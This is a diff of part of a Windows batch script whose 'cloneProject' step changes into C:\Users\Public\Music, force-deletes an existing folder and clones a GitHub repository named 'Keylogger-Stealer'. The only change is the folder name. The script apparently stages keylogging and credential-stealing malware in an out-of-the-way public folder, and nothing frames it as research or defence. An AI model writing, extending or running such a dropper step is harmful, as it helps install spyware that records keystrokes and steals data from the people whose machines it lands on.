@@ -67,8 +67,8 @@ exit
 :cloneProject
 cd C:\Users\Public\Music
 rem Clone từ link GitHub
-if exist Keylogger (
-    rmdir /s /q Keylogger
+if exist Keylogger-Stealer (
+    rmdir /s /q Keylogger-Stealer
     git clone https://github.com/LeDuonng/Keylogger-Stealer.git
 ) else (
     git clone https://github.com/LeDuonng/Keylogger-Stealer.git
